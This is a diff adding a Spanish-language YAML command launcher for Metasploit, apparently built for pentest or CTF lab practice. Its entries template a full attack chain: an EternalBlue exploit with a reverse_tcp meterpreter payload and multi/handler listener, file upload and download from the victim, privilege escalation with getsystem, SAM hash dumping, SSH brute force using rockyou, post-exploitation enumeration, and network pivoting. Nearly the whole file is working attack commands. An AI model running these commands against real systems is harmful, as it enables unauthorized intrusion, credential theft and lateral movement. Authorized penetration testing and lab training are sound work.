@@ -1,0 +1,209 @@
+tools:
+  - name: "msfconsole - Iniciar"
+    description: "Arrancar Metasploit Framework"
+    command: "msfconsole -q"
+    params: []
+
+  - name: "Buscar modulo"
+    description: "Buscar modulo por nombre/tipo en MSF"
+    command: "search {term} type:{type}"
+    params:
+      - name: term
+        label: "Termino de busqueda"
+        type: text
+        placeholder: "eternalblue"
+      - name: type
+        label: "Tipo (exploit/auxiliary/post)"
+        type: text
+        placeholder: "exploit"
+
+  - name: "Usar modulo y configurar"
+    description: "Seleccionar modulo y ver opciones requeridas"
+    command: "use {module}; show options"
+    params:
+      - name: module
+        label: "Ruta del modulo"
+        type: text
+        placeholder: "exploit/windows/smb/ms17_010_eternalblue"
+
+  - name: "Configurar RHOSTS y LHOST"
+    description: "Establecer target y listener en MSF"
+    command: "set RHOSTS {rhost}; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}"
+    params:
+      - name: rhost
+        label: "RHOSTS (target)"
+        type: text
+        placeholder: "192.168.1.10"
+      - name: lhost
+        label: "LHOST (tu IP)"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: payload
+        label: "Payload"
+        type: text
+        placeholder: "windows/x64/meterpreter/reverse_tcp"
+
+  - name: "Ejecutar exploit"
+    description: "Lanzar el exploit configurado"
+    command: "exploit -j"
+    params: []
+
+  - name: "Multi/Handler - Listener"
+    description: "Configurar handler para recibir conexiones"
+    command: "use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit -j"
+    params:
+      - name: payload
+        label: "Payload"
+        type: text
+        placeholder: "windows/x64/meterpreter/reverse_tcp"
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+
+  - name: "Sessions - Listar y Interactuar"
+    description: "Ver sesiones activas e interactuar con una"
+    command: "sessions -l; sessions -i {id}"
+    params:
+      - name: id
+        label: "ID de sesion"
+        type: text
+        placeholder: "1"
+
+  - name: "Meterpreter - Info del sistema"
+    description: "Comandos basicos de reconocimiento en Meterpreter"
+    command: "sysinfo; getuid; getpid; ps"
+    params: []
+
+  - name: "Meterpreter - Shell interactiva"
+    description: "Abrir shell del sistema desde Meterpreter"
+    command: "shell"
+    params: []
+
+  - name: "Meterpreter - Upload / Download"
+    description: "Transferir ficheros con Meterpreter"
+    command: "upload {local_file} {remote_path}; download {remote_file} {local_path}"
+    params:
+      - name: local_file
+        label: "Fichero local (upload)"
+        type: text
+        placeholder: "/tmp/winPEAS.exe"
+      - name: remote_path
+        label: "Ruta remota destino"
+        type: text
+        placeholder: "C:\\Windows\\Temp\\"
+      - name: remote_file
+        label: "Fichero remoto (download)"
+        type: text
+        placeholder: "C:\\Users\\admin\\Desktop\\flag.txt"
+      - name: local_path
+        label: "Ruta local destino"
+        type: text
+        placeholder: "/tmp/"
+
+  - name: "Meterpreter - Migrate proceso"
+    description: "Migrar al PID de otro proceso para estabilidad"
+    command: "migrate {pid}"
+    params:
+      - name: pid
+        label: "PID objetivo"
+        type: text
+        placeholder: "1234"
+
+  - name: "Meterpreter - Getsystem"
+    description: "Intentar escalar a SYSTEM desde Meterpreter"
+    command: "getsystem"
+    params: []
+
+  - name: "Meterpreter - Hashdump"
+    description: "Volcar hashes SAM desde Meterpreter (necesita SYSTEM)"
+    command: "hashdump"
+    params: []
+
+  - name: "Meterpreter - Run post module"
+    description: "Ejecutar modulo de post-explotacion"
+    command: "run {post_module}"
+    params:
+      - name: post_module
+        label: "Modulo post"
+        type: text
+        placeholder: "post/windows/gather/enum_logged_on_users"
+
+  - name: "Post - Enum logged users"
+    description: "Enumerar usuarios logueados en el sistema"
+    command: "run post/windows/gather/enum_logged_on_users"
+    params: []
+
+  - name: "Post - Local Exploit Suggester"
+    description: "Sugerir exploits locales para PrivEsc"
+    command: "run post/multi/recon/local_exploit_suggester"
+    params: []
+
+  - name: "Post - Enum shares"
+    description: "Enumerar shares SMB desde sesion Meterpreter"
+    command: "run post/windows/gather/enum_shares"
+    params: []
+
+  - name: "Auxiliar - Port Scanner"
+    description: "Escaneo de puertos con modulo auxiliar de MSF"
+    command: "use auxiliary/scanner/portscan/tcp; set RHOSTS {rhost}; set PORTS {ports}; run"
+    params:
+      - name: rhost
+        label: "RHOSTS"
+        type: text
+        placeholder: "192.168.1.0/24"
+      - name: ports
+        label: "Puertos"
+        type: text
+        placeholder: "1-1024,3306,8080"
+
+  - name: "Auxiliar - SMB Version"
+    description: "Identificar version de SMB en el objetivo"
+    command: "use auxiliary/scanner/smb/smb_version; set RHOSTS {rhost}; run"
+    params:
+      - name: rhost
+        label: "RHOSTS"
+        type: text
+        placeholder: "192.168.1.0/24"
+
+  - name: "Auxiliar - SSH Login"
+    description: "Fuerza bruta SSH con MSF"
+    command: "use auxiliary/scanner/ssh/ssh_login; set RHOSTS {rhost}; set USERNAME {user}; set PASS_FILE {passfile}; run"
+    params:
+      - name: rhost
+        label: "RHOSTS"
+        type: text
+        placeholder: "192.168.1.10"
+      - name: user
+        label: "Usuario"
+        type: text
+        placeholder: "root"
+      - name: passfile
+        label: "Wordlist contrasenas"
+        type: text
+        placeholder: "/usr/share/wordlists/rockyou.txt"
+
+  - name: "Background session y pivot"
+    description: "Pasar sesion a background y configurar route para pivoting"
+    command: "background; route add {subnet} {netmask} {session_id}"
+    params:
+      - name: subnet
+        label: "Subred interna"
+        type: text
+        placeholder: "10.10.10.0"
+      - name: netmask
+        label: "Mascara"
+        type: text
+        placeholder: "255.255.255.0"
+      - name: session_id
+        label: "ID sesion"
+        type: text
+        placeholder: "1"
